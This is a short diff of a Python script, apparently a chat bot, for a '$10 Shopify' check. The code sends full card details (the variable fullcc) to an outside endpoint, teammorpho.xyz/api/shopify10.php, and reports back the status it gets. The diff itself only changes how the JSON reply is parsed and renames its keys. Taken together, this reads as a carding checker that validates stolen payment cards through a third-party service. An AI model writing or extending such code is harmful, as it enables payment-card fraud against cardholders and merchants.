@@ -147,9 +147,9 @@ Retry After {after}s
                             tic = time.perf_counter()
                             authurl = f"https://teammorpho.xyz/api/shopify10.php?lista={fullcc}"
                             reqone = session.get(authurl)
-                            data = json.loads(reqone)
-                            stat = data["status"]
-                            ress = data["resp"]
+                            data = reqone.json()
+                            stat = data["stuts"]
+                            ress = data["respp"]
                             fourthresp = f"""
 <b> SHOPIFY $10
 ━━━━━━━━━
